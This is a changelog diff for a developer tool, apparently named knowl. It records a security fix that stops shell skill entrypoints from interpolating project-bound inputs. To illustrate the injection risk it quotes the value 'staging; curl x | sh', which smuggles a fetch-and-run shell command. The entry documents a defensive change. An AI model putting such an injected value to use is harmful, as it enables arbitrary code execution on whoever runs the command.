@@ -3,16 +3,31 @@
 Notable changes to `@dat999zx/knowl`. Versions before 2.1.0 predate this file; see the
 [git tags](https://github.com/dat999zx/knowl/tags) for that history.
 
-## 5.20.0 — 2026-09-04
+## Unreleased
 
 **Global skills: reusable playbooks with project bindings.** A skill can now live once on the machine (`~/.knowl/skills/<name>/`) as a reusable playbook, while each repository provides its own commands and paths via project bindings in `.knowl/config.json`. A playbook and a binding are two keys: neither runs anything alone.
 - **Layering and Shadowing**: Project skills shadow global skills of the same name. `knowl skill list` identifies whether each skill is `project` or `global`.
 - **`requires` block**: Manifests (`skill.yaml` or `skill.json`) declare `inputs`, `capabilities` (`process`, `network`, `write`, `publish`, `delete`), and fail-closed `preconditions` (`clean_worktree`, `on_branch:<name>`, `command_exists:<bin>`).
-- **Strict interpolation**: Only `${inputs.*}` is substituted; shell expansions, environment variables, or missing inputs fail closed before running.
+- **Strict interpolation**: Only `${inputs.*}` is substituted; shell expansions, environment variables, or missing inputs fail closed before running. A `shell` entrypoint cannot interpolate at all — see below.
 - **Approval and planted-package protection**: `knowl skill approve <name> --global` records trust in `~/.knowl/skill-trust.json`. Capabilities with external effects require explicit confirmation. A repository shipping both a local skill and a binding cannot self-approve.
 - **Visible run banner**: Every run displays a banner with the fully resolved command, working directory, declared capabilities, and verified preconditions. Capabilities are declarations, not a sandbox.
 - **Pinning and provenance**: Bindings can pin a version; manifests track origin provenance.
 
+**A `shell` skill entrypoint can no longer interpolate `${inputs.*}`.** A shell entrypoint is a
+command *string*, so a bound value was spliced into it as syntax rather than as a value:
+`deploy ${inputs.target}` with `target` bound to `staging; curl x | sh` is two commands. The rule
+already existed one branch earlier -- a shell entrypoint refuses runtime arguments because "no
+quoting is correct for both cmd.exe and POSIX shells" -- and interpolation, which arrived with
+global playbooks, carried the same hazard with a sharper edge: a binding comes from a *project's*
+config, so a repository could decide what an already-approved global playbook runs, and approval
+would stop covering everything that determines the command.
+
+Both safe routes remain, and the refusal names them. Every bound input is now exported as
+`KNOWL_SKILL_INPUT_<NAME>`, which the command reads rather than the shell parsing it; or use a
+`script` entrypoint, whose arguments are passed as an array and never reach a shell. Script
+entrypoints are unaffected, which is what the documented example already used.
+
+## 5.20.0 — 2026-09-04
 
 **A global memory layer, and the layered read that makes it reachable.** Knowl has had four
 namespaces since long before this release -- session, project, organization, global -- with
